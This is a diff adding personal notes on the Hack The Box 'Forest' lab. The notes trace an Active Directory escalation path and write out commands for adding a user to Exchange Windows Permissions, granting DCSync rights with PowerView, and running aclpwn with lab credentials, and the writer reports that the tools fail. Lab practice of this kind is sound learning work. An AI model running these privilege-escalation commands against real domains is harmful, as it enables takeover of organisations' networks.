@@ -540,4 +540,54 @@ https://www.kali.org/docs/troubleshooting/postgresql-collation-mismatch-error/
 
 okay cool.
 
-"Find Shorter Paths to Domain Admin" is a saved query we should use.
+"Find Shortest Paths to Domain Admin" is a saved query we should use.
+
+okay. it works.
+
+from guide:
+> There’s two jumps needed to get from my current access as svc-alfresco to Administrator, who is in the Domain Admins group.
+
+
+so, it goes:
+
+    svc-alfresco
+    service accounts
+    privileged it accounts
+    account operators
+    windows exchange permissions
+    htb.local
+    users
+    domain admins
+
+
+so i need to use:
+
+    net group "Exchange Windows Permissions" svc-alfresco /add /domain
+
+and next, because "account operators" has "genericAll" onto "windows exchange permissions", I need to do this:
+
+    $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+    $Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', $SecPassword)
+    Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
+
+ohhh....    Add-DomainObjectAcl is a "rotted" piece of code. It no longer exists.
+
+According to people on reddit, 
+https://www.reddit.com/r/hackthebox/comments/jq2ltl/forest_cant_run_adddomainobjectacl/
+
+this does not work anymore. perhaps windows patched it/renamed that cmdlet?
+well. let's consider Forest done and move on.
+https://0xdf.gitlab.io/2020/03/21/htb-forest.html#alternative-tool-aclpwn
+
+actually... let's try `aclpwn`.
+
+    export DP=database_password_for_neo4j_goes_here
+    pipx run aclpwn -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161 -du neo4j -dp $DP
+    s3rvice
+
+
+oh god okay.
+
+spent an hour knee deep in `aclpwn` source code and...well, i'm not rewriting this guy's awesome but broken library for him..
+
+let's give up on Forest and move on.
